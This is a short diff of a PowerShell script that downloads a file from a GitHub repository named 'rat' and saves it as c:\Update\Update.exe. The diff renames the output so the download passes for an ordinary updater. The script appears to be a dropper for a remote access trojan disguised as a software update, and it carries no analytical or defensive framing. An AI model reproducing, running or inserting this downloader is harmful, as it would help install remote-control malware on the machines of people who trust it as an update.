@@ -3,7 +3,7 @@ md Update
 
 cd c:\Update
 
-$f1 = 'c:\Update\Upd0001.exe'
+$f1 = 'c:\Update\Update.exe'
 if (Test-Path $f1) {
    try {	
       Remove-Item $f1 -recurse
@@ -17,7 +17,7 @@ if ($f3) {
 }
 
 $url = "https://raw.githubusercontent.com/itarare/rat/master/Upd0001.txt"
-$output = "c:\Update\Upd.exe"
+$output = "c:\Update\Update.exe"
 $start_time = Get-Date
 
 Invoke-WebRequest -Uri $url -OutFile $output
